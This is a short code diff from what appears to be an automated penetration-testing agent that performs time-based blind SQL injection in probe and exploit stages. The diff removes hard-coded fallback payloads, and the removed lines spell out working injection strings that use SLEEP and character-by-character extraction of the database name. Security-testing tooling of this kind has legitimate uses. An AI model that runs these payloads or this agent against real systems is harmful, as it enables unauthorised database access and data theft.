@@ -206,7 +206,7 @@ def sqli_time_blind_agent(state: ExploitationState) -> dict[str, Any]:
         observations: dict[str, bool] = {}
 
         # Stage 1: PROBE
-        probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe") or ["1' AND SLEEP(3)-- -"]
+        probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe")
         probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
             session, probe_payloads, already_tried, security_level
         )
@@ -225,10 +225,7 @@ def sqli_time_blind_agent(state: ExploitationState) -> dict[str, Any]:
         score = max(score, 1)
 
         # Stage 2: EXPLOIT
-        all_exploit = candidate_payloads_for_stage(state, AGENT_ID, security_level, "exploit") or [
-            "1' AND IF(ASCII(SUBSTR(database(),1,1))>77,SLEEP(3),0)-- -",
-            "1' AND IF(ASCII(SUBSTR(database(),1,1))<123,SLEEP(3),0)-- -",
-        ]
+        all_exploit = candidate_payloads_for_stage(state, AGENT_ID, security_level, "exploit")
 
         exploit_score, tried, confirmed, exploit_events = _attempt_exploit(
             session, all_exploit, already_tried | set(all_tried), security_level
